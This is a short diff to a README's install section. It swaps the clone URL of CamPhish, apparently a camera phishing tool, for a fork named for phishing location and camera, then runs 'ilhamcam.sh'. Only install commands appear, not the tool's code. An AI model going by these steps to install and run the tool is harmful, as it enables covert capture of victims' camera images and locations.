@@ -34,7 +34,7 @@ apt-get -y install php wget unzip
 ## Installing (Kali Linux/Termux):
 
 ```
-git clone https://github.com/techchipnet/CamPhish
+git clone https://github.com/ilham9463975-hub/phising-untuk-lokasi-dan-kamera
 cd ilhamcam
 bash ilhamcam.sh 
 ```
